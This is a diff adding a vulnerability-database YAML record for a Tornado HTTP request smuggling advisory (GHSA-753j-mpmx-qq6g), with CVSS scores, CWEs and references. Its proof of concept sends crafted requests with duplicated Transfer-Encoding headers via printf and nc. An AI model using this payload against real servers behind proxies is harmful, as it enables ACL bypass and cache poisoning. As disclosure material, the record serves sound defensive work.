@@ -1,0 +1,114 @@
+vulnerability_id: VCID-c5mu-8egy-aaae
+aliases:
+  - GHSA-753j-mpmx-qq6g
+summary: |
+  Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling') in tornado
+  ### Summary
+  When Tornado receives a request with two `Transfer-Encoding: chunked` headers, it ignores them both. This enables request smuggling when Tornado is deployed behind a proxy server that emits such requests. [Pound](https://en.wikipedia.org/wiki/Pound_(networking)) does this.
+
+  ### PoC
+  0. Install Tornado.
+  1. Start a simple Tornado server that echoes each received request's body:
+  ```bash
+  cat << EOF > server.py
+  import asyncio
+  import tornado
+
+  class MainHandler(tornado.web.RequestHandler):
+      def post(self):
+          self.write(self.request.body)
+
+  async def main():
+      tornado.web.Application([(r"/", MainHandler)]).listen(8000)
+      await asyncio.Event().wait()
+
+  asyncio.run(main())
+  EOF
+  python3 server.py &
+  ```
+  2. Send a valid chunked request:
+  ```bash
+  printf 'POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\n0\r\n\r\n' | nc localhost 8000
+  ```
+  3. Observe that the response is as expected:
+  ```
+  HTTP/1.1 200 OK
+  Server: TornadoServer/6.3.3
+  Content-Type: text/html; charset=UTF-8
+  Date: Sat, 07 Oct 2023 17:32:05 GMT
+  Content-Length: 1
+
+  Z
+  ```
+  4. Send a request with two `Transfer-Encoding: chunked` headers:
+  ```
+  printf 'POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\n0\r\n\r\n' | nc localhost 8000
+  ```
+  5. Observe the strange response:
+  ```
+  HTTP/1.1 200 OK
+  Server: TornadoServer/6.3.3
+  Content-Type: text/html; charset=UTF-8
+  Date: Sat, 07 Oct 2023 17:35:40 GMT
+  Content-Length: 0
+
+  HTTP/1.1 400 Bad Request
+
+  ```
+  This is because Tornado believes that the request has no message body, so it tries to interpret `1\r\nZ\r\n0\r\n\r\n` as its own request, which causes a 400 response. With a little cleverness involving `chunk-ext`s, you can get Tornado to instead respond 405, which has the potential to desynchronize the connection, as opposed to 400 which should always result in a connection closure.
+
+  ### Impact
+  Anyone using Tornado behind a proxy that forwards requests containing multiple `Transfer-Encoding: chunked` headers is vulnerable to request smuggling, which may entail ACL bypass, cache poisoning, or connection desynchronization.
+severities:
+  - score: MODERATE
+    scoring_system: cvssv3.1_qr
+    scoring_elements:
+    published_at: None
+    url: https://github.com/advisories/GHSA-753j-mpmx-qq6g
+  - score: '6.1'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+    published_at: None
+    url: https://github.com/tornadoweb/tornado
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/tornadoweb/tornado
+  - score: '5.3'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
+    published_at: None
+    url: https://github.com/tornadoweb/tornado/commit/d65f6e71a77f53a1ff0a0dc55704be13f04eb572
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/tornadoweb/tornado/commit/d65f6e71a77f53a1ff0a0dc55704be13f04eb572
+  - score: '5.3'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
+    published_at: None
+    url: https://github.com/tornadoweb/tornado/security/advisories/GHSA-753j-mpmx-qq6g
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/tornadoweb/tornado/security/advisories/GHSA-753j-mpmx-qq6g
+weaknesses:
+  - CWE-937
+  - CWE-1035
+  - CWE-444
+references:
+  - url: https://github.com/tornadoweb/tornado
+    reference_type:
+    reference_id:
+  - url: https://github.com/tornadoweb/tornado/commit/d65f6e71a77f53a1ff0a0dc55704be13f04eb572
+    reference_type:
+    reference_id:
+  - url: https://github.com/tornadoweb/tornado/security/advisories/GHSA-753j-mpmx-qq6g
+    reference_type:
+    reference_id:
+  - url: https://github.com/advisories/GHSA-753j-mpmx-qq6g
+    reference_type:
+    reference_id: GHSA-753j-mpmx-qq6g
